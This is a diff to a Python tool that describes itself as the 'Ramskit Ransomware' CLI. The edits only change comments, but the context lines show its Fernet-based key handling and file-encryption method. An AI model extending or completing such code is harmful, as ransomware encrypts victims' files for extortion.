@@ -22,7 +22,7 @@ from cryptography.fernet import Fernet
 
 current_version = "v1.0.0"
 
-# FIXME 1: Add usages for encrypt
+# TODO 1: Add usages for encrypt
 class Ramskit:
     def __init__(self) -> None:
         print(f"[x] Starting Ramskit {current_version}")
@@ -33,7 +33,8 @@ class Ramskit:
             print("[x] Key does not exist.\n[x]Creating key...")
             self.key = Ramskit.generate_key()
         print(f"[x] Key is {self.key}")
-
+    
+    # FIXME: Fix encrypt method
     def encrypt_file(self, items, key) -> None:
         f = Fernet(key)
         for item in items:
@@ -86,7 +87,7 @@ class Ramskit:
         else:
             yield something
 
-
+# TODO 2: Add usages for Ramski framework
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
     parser.add_argument('-a', '--action', dest="action", required=True,
